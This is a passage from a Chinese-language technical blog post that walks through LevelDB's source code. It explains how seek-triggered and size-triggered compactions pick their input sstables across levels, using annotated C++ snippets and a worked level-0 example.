one seek costs approximately the</span></span><br><span class="line">    <span class="comment">// same as the compaction of 40KB of data.  We are a little</span></span><br><span class="line">    <span class="comment">// conservative and allow approximately one seek for every 16KB</span></span><br><span class="line">    <span class="comment">// of data before triggering a compaction.</span></span><br><span class="line">    f-&gt;allowed_seeks = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;((f-&gt;file_size / <span class="number">16384U</span>));</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;allowed_seeks &lt; <span class="number">100</span>) f-&gt;allowed_seeks = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    levels_[level].deleted_files.erase(f-&gt;number);</span><br><span class="line">    levels_[level].added_files-&gt;insert(f);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里说的是， 根据估算，大概每25次seek的time cost = 1次compaction的。保守估计，1次seek相当于compaction16kb的数据。 所以==当seek的总耗时约等于一次compaction的耗时时，就触发一次compaction==。则允许seek的次数为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;allowed_seeks = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;((f-&gt;file_size / <span class="number">16384U</span>)); <span class="comment">// file_size/16KB</span></span><br></pre></td></tr></table></figure><h1 id="2-如何确定Compaction的输入源"><a href="#2-如何确定Compaction的输入源" class="headerlink" title="2. 如何确定Compaction的输入源"></a>2. 如何确定Compaction的输入源</h1><p>结合前面两种compaction来看，触发compaction的时机：</p><ol><li>size compaction :文件过多或文件过大</li><li>seek compaction: seek次数过多。</li></ol><p>现在回到==DBImpl::BackgroundCompaction:==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::BackgroundCompaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (imm_ != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    CompactMemTable();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Compaction* c;</span><br><span class="line">  <span class="keyword">bool</span> is_manual = (manual_compaction_ != <span class="literal">nullptr</span>);</span><br><span class="line">  InternalKey manual_end;</span><br><span class="line">  <span class="keyword">if</span> (is_manual) &#123;</span><br><span class="line">    ManualCompaction* m = manual_compaction_;</span><br><span class="line">    c = versions_-&gt;CompactRange(m-&gt;level, m-&gt;<span class="built_in">begin</span>, m-&gt;<span class="built_in">end</span>);</span><br><span class="line">    m-&gt;done = (c == <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      manual_end = c-&gt;input(<span class="number">0</span>, c-&gt;num_input_files(<span class="number">0</span>) - <span class="number">1</span>)-&gt;largest;</span><br><span class="line">    &#125;</span><br><span class="line">    Log(options_.info_log,</span><br><span class="line">        <span class="string">"Manual compaction at level-%d from %s .. %s; will stop at %s\n"</span>,</span><br><span class="line">        m-&gt;level, (m-&gt;<span class="built_in">begin</span> ? m-&gt;<span class="built_in">begin</span>-&gt;DebugString().c_str() : <span class="string">"(begin)"</span>),</span><br><span class="line">        (m-&gt;<span class="built_in">end</span> ? m-&gt;<span class="built_in">end</span>-&gt;DebugString().c_str() : <span class="string">"(end)"</span>),</span><br><span class="line">        (m-&gt;done ? <span class="string">"(end)"</span> : manual_end.DebugString().c_str()));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">// 现在只看非manual的情况</span></span><br><span class="line">    c = versions_-&gt;PickCompaction();</span><br><span class="line">  &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-PickCompaction"><a href="#1-PickCompaction" class="headerlink" title="1. PickCompaction"></a>1. PickCompaction</h2><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>PickCompaction流程图：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-PickCompaction.png" style="zoom: 33%;" /><p>转到==PickCompaction==函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pick level and inputs for a new compaction.</span></span><br><span class="line"><span class="comment">// Returns nullptr if there is no compaction to be done.</span></span><br><span class="line"><span class="comment">// Otherwise returns a pointer to a heap-allocated object that</span></span><br><span class="line"><span class="comment">// describes the compaction.  Caller should delete the result.</span></span><br><span class="line"><span class="function">Compaction* <span class="title">PickCompaction</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Compaction* <span class="title">VersionSet::PickCompaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Compaction* c;</span><br><span class="line">  <span class="keyword">int</span> level;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 优先考虑 size_compaction, 再考虑seek_compaction.</span></span><br><span class="line">  <span class="comment">// We prefer compactions triggered by too much data in a level over</span></span><br><span class="line">  <span class="comment">// the compactions triggered by seeks.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> size_compaction = (current_-&gt;compaction_score_ &gt;= <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> seek_compaction = (current_-&gt;file_to_compact_ != <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (size_compaction) &#123;</span><br><span class="line">    level = current_-&gt;compaction_level_;</span><br><span class="line">    assert(level &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(level + <span class="number">1</span> &lt; <span class="built_in">config</span>::kNumLevels);</span><br><span class="line">    c = <span class="keyword">new</span> Compaction(options_, level);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pick the first file that comes after compact_pointer_[level]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; current_-&gt;files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      FileMetaData* f = current_-&gt;files_[level][i];</span><br><span class="line">      <span class="keyword">if</span> (compact_pointer_[level].empty() ||</span><br><span class="line">          icmp_.Compare(f-&gt;largest.Encode(), compact_pointer_[level]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        c-&gt;inputs_[<span class="number">0</span>].push_back(f);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;inputs_[<span class="number">0</span>].empty()) &#123;</span><br><span class="line">      <span class="comment">// Wrap-around to the beginning of the key space</span></span><br><span class="line">      c-&gt;inputs_[<span class="number">0</span>].push_back(current_-&gt;files_[level][<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (seek_compaction) &#123;</span><br><span class="line">    level = current_-&gt;file_to_compact_level_;</span><br><span class="line">    c = <span class="keyword">new</span> Compaction(options_, level);</span><br><span class="line">    c-&gt;inputs_[<span class="number">0</span>].push_back(current_-&gt;file_to_compact_);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  c-&gt;input_version_ = current_;</span><br><span class="line">  c-&gt;input_version_-&gt;Ref();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Files in level 0 may overlap each other, so pick up all overlapping ones</span></span><br><span class="line">  <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">    InternalKey smallest, largest;</span><br><span class="line">    GetRange(c-&gt;inputs_[<span class="number">0</span>], &amp;smallest, &amp;largest);</span><br><span class="line">    <span class="comment">// Note that the next call will discard the file we placed in</span></span><br><span class="line">    <span class="comment">// c-&gt;inputs_[0] earlier and replace it with an overlapping set</span></span><br><span class="line">    <span class="comment">// which will include the picked file.</span></span><br><span class="line">    current_-&gt;GetOverlappingInputs(<span class="number">0</span>, &amp;smallest, &amp;largest, &amp;c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">    assert(!c-&gt;inputs_[<span class="number">0</span>].empty());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SetupOtherInputs(c);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据函数签名注释，PickCompaction的作用是，找到level以及level对应的需要compaction的文件。现在来拆开代码看：</p><p>优先考虑 size_compaction, 再考虑seek_compaction.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We prefer compactions triggered by too much data in a level over</span></span><br><span class="line"><span class="comment">// the compactions triggered by seeks.</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> size_compaction = (current_-&gt;compaction_score_ &gt;= <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> seek_compaction = (current_-&gt;file_to_compact_ != <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure><h3 id="1-Size-Compaction"><a href="#1-Size-Compaction" class="headerlink" title="1. Size Compaction"></a>1. Size Compaction</h3><h4 id="1-leve-n的sstable确定"><a href="#1-leve-n的sstable确定" class="headerlink" title="1. leve n的sstable确定"></a>1. leve n的sstable确定</h4><ol><li>得到  level[n]的输入源</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size_compaction) &#123;</span><br><span class="line">   level = current_-&gt;compaction_level_;</span><br><span class="line">   assert(level &gt;= <span class="number">0</span>);</span><br><span class="line">   assert(level + <span class="number">1</span> &lt; <span class="built_in">config</span>::kNumLevels);</span><br><span class="line">   c = <span class="keyword">new</span> Compaction(options_, level);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Pick the first file that comes after compact_pointer_[level]</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; current_-&gt;files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">     FileMetaData* f = current_-&gt;files_[level][i];</span><br><span class="line">     <span class="keyword">if</span> (compact_pointer_[level].empty() ||</span><br><span class="line">         icmp_.Compare(f-&gt;largest.Encode(), compact_pointer_[level]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">       c-&gt;inputs_[<span class="number">0</span>].push_back(f);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (c-&gt;inputs_[<span class="number">0</span>].empty()) &#123;</span><br><span class="line">     <span class="comment">// Wrap-around to the beginning of the key space</span></span><br><span class="line">     c-&gt;inputs_[<span class="number">0</span>].push_back(current_-&gt;files_[level][<span class="number">0</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>inputs_数组中存放的是输入源。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Each compaction reads inputs from "level_" and "level_+1"</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; inputs_[<span class="number">2</span>];  <span class="comment">// The two sets of inputs</span></span><br></pre></td></tr></table></figure><p>接着看<code>size_compaction</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">level = current_-&gt;compaction_level_;</span><br><span class="line">assert(level &gt;= <span class="number">0</span>);</span><br><span class="line">assert(level + <span class="number">1</span> &lt; <span class="built_in">config</span>::kNumLevels);</span><br><span class="line">c = <span class="keyword">new</span> Compaction(options_, level);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个文件，其最大key比 compact_pointer_[level]的key大</span></span><br><span class="line"><span class="comment">// Pick the first file that comes after compact_pointer_[level]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; current_-&gt;files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    FileMetaData* f = current_-&gt;files_[level][i];</span><br><span class="line">    <span class="keyword">if</span> (compact_pointer_[level].empty() ||</span><br><span class="line">        icmp_.Compare(f-&gt;largest.Encode(), compact_pointer_[level]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        c-&gt;inputs_[<span class="number">0</span>].push_back(f);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果找不到这样的文件，从level头开始（round-robin)</span></span><br><span class="line"><span class="keyword">if</span> (c-&gt;inputs_[<span class="number">0</span>].empty()) &#123;</span><br><span class="line">    <span class="comment">// Wrap-around to the beginning of the key space</span></span><br><span class="line">    c-&gt;inputs_[<span class="number">0</span>].push_back(current_-&gt;files_[level][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>size_compation中<strong>只用确定一个要输入的 sstable文件。</strong> 接着看：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Files in level 0 may overlap each other, so pick up all overlapping ones</span></span><br><span class="line"><span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">    InternalKey smallest, largest;</span><br><span class="line">    GetRange(c-&gt;inputs_[<span class="number">0</span>], &amp;smallest, &amp;largest);</span><br><span class="line">    <span class="comment">// Note that the next call will discard the file we placed in</span></span><br><span class="line">    <span class="comment">// c-&gt;inputs_[0] earlier and replace it with an overlapping set</span></span><br><span class="line">    <span class="comment">// which will include the picked file.</span></span><br><span class="line">    current_-&gt;GetOverlappingInputs(<span class="number">0</span>, &amp;smallest, &amp;largest, &amp;c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">    assert(!c-&gt;inputs_[<span class="number">0</span>].empty());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>level0由于存在overlap key，所以需要这些key加入。看注释有一点值得注意：</p><blockquote><p>在GetOverlappingInputs函数中，会discard我们之前加入的sstable filemeta, 但是后会replace一个overlap set，这个overlap set将会包含之前picked file。</p><p>是否还包含，这点还有待验证。</p></blockquote><h4 id="GetOverlappingInputs函数"><a href="#GetOverlappingInputs函数" class="headerlink" title="GetOverlappingInputs函数"></a>GetOverlappingInputs函数</h4><p>继续深追到GetOverlappingInputs:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Store in "*inputs" all files in "level" that overlap [begin,end]</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Version::GetOverlappingInputs</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">const</span> InternalKey* <span class="built_in">begin</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> InternalKey* <span class="built_in">end</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;* inputs)</span> </span>&#123;</span><br><span class="line">  assert(level &gt;= <span class="number">0</span>);</span><br><span class="line">  assert(level &lt; <span class="built_in">config</span>::kNumLevels);</span><br><span class="line">  inputs-&gt;<span class="built_in">clear</span>();<span class="comment">// 清空</span></span><br><span class="line">  Slice user_begin, user_end;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">begin</span> != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    user_begin = <span class="built_in">begin</span>-&gt;user_key();<span class="comment">// 确定begin</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">end</span> != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    user_end = <span class="built_in">end</span>-&gt;user_key();<span class="comment">// 确定end</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> Comparator* user_cmp = vset_-&gt;icmp_.user_comparator();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; files_[level].<span class="built_in">size</span>();) &#123;</span><br><span class="line">    FileMetaData* f = files_[level][i++];</span><br><span class="line">    <span class="keyword">const</span> Slice file_start = f-&gt;smallest.user_key();</span><br><span class="line">    <span class="keyword">const</span> Slice file_limit = f-&gt;largest.user_key();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">begin</span> != <span class="literal">nullptr</span> &amp;&amp; user_cmp-&gt;Compare(file_limit, user_begin) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// "f" is completely before specified range; skip it</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">end</span> != <span class="literal">nullptr</span> &amp;&amp; user_cmp-&gt;Compare(file_start, user_end) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// "f" is completely after specified range; skip it</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      inputs-&gt;push_back(f);</span><br><span class="line">      <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;<span class="comment">// 对于level0，由于存在overlap key，所以可能会扩大begin和end的范围，一旦扩大，重新搜索整个files.</span></span><br><span class="line">        <span class="comment">// Level-0 files may overlap each other.  So check if the newly</span></span><br><span class="line">        <span class="comment">// added file has expanded the range.  If so, restart search.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">begin</span> != <span class="literal">nullptr</span> &amp;&amp; user_cmp-&gt;Compare(file_start, user_begin) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">          user_begin = file_start;</span><br><span class="line">          inputs-&gt;<span class="built_in">clear</span>();</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">end</span> != <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">                   user_cmp-&gt;Compare(file_limit, user_end) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          user_end = file_limit;</span><br><span class="line">          inputs-&gt;<span class="built_in">clear</span>();</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码的工作是，根据在PickCompaction() 中选定的文件，确定初步的key range[begin,end], 然后在level0中选择所有与该key range有重叠的sstable，<strong>同时每选择一个还会扩大key range，然后重新add。</strong></p><h4 id="举个例子（level0-compaction的sstable选择）"><a href="#举个例子（level0-compaction的sstable选择）" class="headerlink" title="举个例子（level0 compaction的sstable选择）"></a>举个例子（level0 compaction的sstable选择）</h4><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LWxldmVsMA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-level0">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-level0<i class="fa fa-external-link"></i></span> compaction.png)</p><p>假设在level 0中选择了<strong>8-14</strong> 这个sstable。现在从头开始遍历，查看是否有需要加入的其他sstable。</p><p>第一次，搜索3-6，因为3-6与8-14无重叠，所以无需加入。</p><p>第二次，搜索5-12，因为5-12与8-14有重叠，所以加入5-12。 同时由于现在是level0，5-12扩大了搜索域的下界，现在的搜索域改为 <strong>5-14</strong>, 清空所有已经加入的sstable，重头开始。</p><p>第三次，搜索3-6，因为3-6与5-14有重叠，所以加入3-6.</p><p>第四次，搜索5-12，因为5-12与5-14有重叠，所以5-12.</p><p>第五次，所有8-14，因为8-14与5-14有重叠，所以加入8-14.</p><p>最后加入的sstable，包括3-6，5-12，8-14.</p><p>==上面说的，都是如何level n的输入源，总结起来就是，除了level0，其余level只加入一个sstable，level0可能加入多个sstable==</p><h4 id="2-level-n-1的sstable确定"><a href="#2-level-n-1的sstable确定" class="headerlink" title="2. level n+1的sstable确定"></a>2. level n+1的sstable确定</h4><p>level n+1是在==SetupOtherInputs== 函数中确定的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionSet::SetupOtherInputs</span><span class="params">(Compaction* c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> level = c-&gt;level();</span><br><span class="line">  InternalKey smallest, largest;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 扩展上边界 </span></span><br><span class="line">  AddBoundaryInputs(icmp_, current_-&gt;files_[level], &amp;c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">   <span class="comment">// 获取当前level n的range</span></span><br><span class="line">  GetRange(c-&gt;inputs_[<span class="number">0</span>], &amp;smallest, &amp;largest);</span><br><span class="line">   <span class="comment">// 获取level n+1中与 level n的range重叠的sstable，将这些sstable存放在c-&gt;inputs_[1]中</span></span><br><span class="line">  current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;smallest, &amp;largest,</span><br><span class="line">                                 &amp;c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get entire range covered by compaction</span></span><br><span class="line">  InternalKey all_start, all_limit;</span><br><span class="line">   <span class="comment">// 计算leveln level n+1的range</span></span><br><span class="line">  GetRange2(c-&gt;inputs_[<span class="number">0</span>], c-&gt;inputs_[<span class="number">1</span>], &amp;all_start, &amp;all_limit);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See if we can grow the number of inputs in "level" without</span></span><br><span class="line">  <span class="comment">// changing the number of "level+1" files we pick up.</span></span><br><span class="line">  <span class="keyword">if</span> (!c-&gt;inputs_[<span class="number">1</span>].empty()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; expanded0;</span><br><span class="line">    current_-&gt;GetOverlappingInputs(level, &amp;all_start, &amp;all_limit, &amp;expanded0);</span><br><span class="line">    AddBoundaryInputs(icmp_, current_-&gt;files_[level], &amp;expanded0);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> inputs0_size = TotalFileSize(c-&gt;inputs_[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> inputs1_size = TotalFileSize(c-&gt;inputs_[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int64_t</span> expanded0_size = TotalFileSize(expanded0);</span><br><span class="line">    <span class="keyword">if</span> (expanded0.<span class="built_in">size</span>() &gt; c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp;</span><br><span class="line">        inputs1_size + expanded0_size &lt;</span><br><span class="line">            ExpandedCompactionByteSizeLimit(options_)) &#123;</span><br><span class="line">      InternalKey new_start, new_limit;</span><br><span class="line">      GetRange(expanded0, &amp;new_start, &amp;new_limit);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; expanded1;</span><br><span class="line">      current_-&gt;GetOverlappingInputs(level + <span class="number">1</span>, &amp;new_start, &amp;new_limit,</span><br><span class="line">                                     &amp;expanded1);</span><br><span class="line">      <span class="keyword">if</span> (expanded1.<span class="built_in">size</span>() == c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()) &#123;</span><br><span class="line">        Log(options_-&gt;info_log,</span><br><span class="line">            <span class="string">"Expanding@%d %d+%d (%ld+%ld bytes) to %d+%d (%ld+%ld bytes)\n"</span>,</span><br><span class="line">            level, <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>()), <span class="keyword">int</span>(c-&gt;inputs_[<span class="number">1</span>].<span class="built_in">size</span>()),</span><br><span class="line">            <span class="keyword">long</span>(inputs0_size), <span class="keyword">long</span>(inputs1_size), <span class="keyword">int</span>(expanded0.<span class="built_in">size</span>()),</span><br><span class="line">            <span 